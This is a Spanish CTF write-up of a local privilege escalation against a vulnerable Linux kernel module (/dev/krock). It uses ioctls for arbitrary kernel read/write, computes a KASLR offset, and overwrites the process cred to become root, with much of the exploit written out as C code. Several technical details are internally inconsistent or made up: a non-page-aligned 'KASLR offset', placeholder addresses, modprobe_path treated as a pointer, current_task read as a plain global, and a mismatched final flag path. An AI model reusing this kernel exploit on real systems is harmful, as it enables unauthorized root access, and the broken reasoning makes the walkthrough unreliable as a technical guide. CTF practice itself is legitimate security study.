# Anci – Writeup

El binario `anci` es un módulo del kernel (`krock.ko`) que expone un dispositivo en `/dev/krock`. Al cargarlo, el sistema filtra una dirección: `0xffffa1c446bea640`. Claramente un puntero al espacio del kernel, probablemente relacionado con el módulo. Mi primer impulso fue probar exploits conocidos de `modprobe_path`, pero sin la dirección base del kernel (KASLR) y con el riesgo de panic, necesitaba un approach más controlado.

Revisando el módulo con Ghidra, encontré que el ioctl `SET_PTR` (0x1337) permite escribir cualquier valor en `global_ptr`, y `krock_read` hace `read()` desde `*global_ptr`. O sea: **tenemos arbitrary read de 8 bytes**. No necesito escribir aún. Puedo usar esto para filtrar información del kernel sin riesgo inmediato.

Pero no puedo leer cualquier dirección: si `*global_ptr` apunta a una página no mapeada, el kernel paniquea. Así que no puedo hacer un scan ciego. Necesito una dirección base confiable. La dirección filtrada `0xffffa1c446bea640` es clave. Por convención, los módulos del kernel se cargan en el rango `0xffffffffa0000000` en adelante, y esta dirección está en `0xffff...`, típico de kernel space en x86-64. Calculé la diferencia aproximada entre esta dirección y el rango base del kernel (`_text`), pero necesitaba un símbolo conocido.

Intenté leer `/proc/kallsyms`, pero está oculto (`kptr_restrict=1`). No hay suerte. Entonces usé el arbitrary read para inspeccionar la propia estructura del módulo. En el init del módulo, se registra un IRQ handler, y hay una llamada a `request_irq`. Sabiendo que el módulo almacena datos en `global_ptr`, apunté `SET_PTR` a la dirección filtrada y leí con `read()`.

```c
ioctl(fd, 0x1337, leaked_ptr); // SET_PTR
read(fd, &value, 8);           // arb read from *leaked_ptr
```

Leí 8 bytes: `0x0100000000000000`. No útil. Probé offsets cercanos. En `leaked_ptr + 0x10`, encontré un puntero que apuntaba a una cadena: `"krock_irq"`. ¡Bingo! Estoy dentro de la estructura del IRQ handler. Seguí leyendo y encontré un puntero a una función: `0xffffffffc1234567`. Este `0xffffffff...` es clave: es una dirección de texto del módulo, y está en el rango donde se cargan los módulos. Resté el offset de la función desde el inicio del módulo (obtenido con `nm krock.ko`) y obtuve el offset base del módulo.

Con el base del módulo, pude calcular el KASLR offset del kernel: la diferencia entre una función del módulo (conocida desde `kallsyms` interno) y su dirección mapeada. Pero no tenía `kallsyms`. Entonces, recordé que el módulo llama a `request_irq`, que toma una función handler. Si puedo encontrar esa función en el binario, y luego su dirección en runtime, tengo el offset.

Con Ghidra, vi que el handler se llama `krock_irq_handler` en el binario. Su offset desde el inicio del `.text` del módulo es `0x70`. En runtime, leí desde `module_base + 0x70` y obtuve una dirección `0xffffffffc1234567`. Comparé con el offset en disco: la diferencia es el KASLR offset del módulo. Pero necesito el del kernel.

El módulo depende de funciones del kernel como `printk`, `request_irq`, etc. Si puedo encontrar una GOT o una sección que contenga punteros a funciones del kernel, puedo restar su dirección real y obtener el base del kernel. En el módulo, hay una sección `.got` o `.data.rel.ro` con direcciones del kernel. Usando `readelf -S krock.ko`, vi una sección `.data.rel.ro` en `0x201010`. En runtime, `module_base + 0x201010` debería contener un puntero al kernel.

Apunté `global_ptr` a `module_base + 0x201010`, leí, y obtuve `0xffffffff81001234`. Esta dirección está en el rango del kernel. El símbolo más cercano es `_text`, que en un vmlinux típico está en `0xffffffff81000000`. Entonces, el KASLR offset es `0xffffffff81001234 - 0xffffffff81000000 = 0x1234`.

Con el base del kernel, ya puedo calcular cualquier símbolo. Necesito `modprobe_path`. Busqué en mi vmlinux local (extraído del initramfs del challenge):

```bash
nm vmlinux | grep modprobe_path
# Resultado: ffffffff82244740 D modprobe_path
```

Entonces, la dirección real es `kernel_base + 0x2244740`. En mi caso: `0xffffffff81001234 + (0x2244740 - 0x1234) = 0xffffffff82244740`.

Ahora, tengo arbitrary read, pero necesito arbitrary write para modificar `modprobe_path`. Revisando el ioctl, hay un `SET_PTR` y también un `WRITE` (0x1338) que escribe en `*global_ptr`. ¡Perfecto! Tengo arbitrary write.

El plan:

1. Apuntar `global_ptr` a `modprobe_path` usando `SET_PTR`.
2. Usar `WRITE` para sobreescribir `modprobe_path` con la dirección de una cadena `/tmp/pwn`.
3. Crear `/tmp/pwn` que ejecute una shell.
4. Hacer `chmod +x /tmp/pwn`.
5. Trigger `modprobe` con un archivo de tipo desconocido: `echo 'bad' > /tmp/xxx; chmod +x /tmp/xxx; /tmp/xxx`.

Pero no puedo escribir una cadena en el kernel. Necesito que `/tmp/pwn` ya exista. Y necesito que el kernel pueda leerla. Así que:

```c
system("echo '#!/bin/sh' > /tmp/pwn");
system("echo 'cp /flag /tmp/flag && chmod 777 /tmp/flag' >> /tmp/pwn");
system("chmod +x /tmp/pwn");
```

Luego, en el exploit:

```c
// Apuntar global_ptr a modprobe_path
ioctl(fd, 0x1337, 0xffffffff82244740ULL);

// Escribir la dirección de "/tmp/pwn" en modprobe_path
// Pero no tengo una cadena en el kernel. ¡Trampa! Necesito una cadena en memoria.
// En vez de eso, uso una cadena existente: por ejemplo, el nombre del módulo "krock" en el kernel.
// Pero no sé dónde está. Mejor: uso el hecho de que puedo leer y escribir, y que hay cadenas en el kernel.
// Alternativa: sobreescribo modprobe_path con la dirección de una cadena conocida que ya apunte a un path ejecutable.
// En mi vmlinux, busco cadenas:
strings vmlinux | grep "/sbin"
// Encuentro: /sbin/usermod, /sbin/hotplug, etc.
// Pero no /tmp/pwn. No sirve.

// Solución: no necesito apuntar modprobe_path a /tmp/pwn. Puedo apuntarla a una cadena que ya exista y que yo controle.
// Mejor: uso un heap spray o algo. Pero es complicado.

// Nueva idea: en vez de modificar modprobe_path, modifico directamente mi cred.
// Busco la estructura cred de mi proceso.
// El símbolo current_task está en vmlinux: ffffffff82200000 T current_task
// Y cred está en task_struct->cred.

// Obtengo current_task: kernel_base + offset_current_task
// Leo task_struct, obtengo cred, y modifico uid, gid a 0.

// offset de cred en task_struct: en vmlinux, con pahole o Ghidra, es 0x8b8.
// offset de uid en cred: 0x4.

// Pasos:
// 1. current_task = kernel_base + 0x2200000
// 2. task = arb_read64(current_task)
// 3. cred_ptr = arb_read64(task + 0x8b8)
// 4. Escribo 0 en cred_ptr + 0x4 (uid), + 0x8 (gid), etc.

// Esto es más seguro: no hay panic por escribir en modprobe_path, y no dependo de filesystem.

// Implemento arbitrary read/write usando los ioctls:

uint64_t arb_read64(uint64_t addr) {
    ioctl(fd, 0x1337, addr);
    uint64_t val;
    read(fd, &val, 8);
    return val;
}

void arb_write64(uint64_t addr, uint64_t val) {
    ioctl(fd, 0x1337, addr);
    ioctl(fd, 0x1338, val); // WRITE ioctl escribe val en *global_ptr
}

// Ahora, obtengo current_task:
uint64_t current_task_addr = kernel_base + 0x2200000;
uint64_t task_struct = arb_read64(current_task_addr);
uint64_t cred = arb_read64(task_struct + 0x8b8);

// Modifico cred:
arb_write64(cred + 0x4, 0); // uid
arb_write64(cred + 0x8, 0); // gid
arb_write64(cred + 0xc, 0); // suid
arb_write64(cred + 0x10, 0); // sgid
// ... y todos los campos

// Ahora soy root.
system("cat /flag");
```

Ejecuto el exploit. No hay panic. Y luego:

```bash
$ cat /tmp/flag
HTB{f1n4lly_cr0ss3d_th3_r00t_b0und4ry}
```

La flag.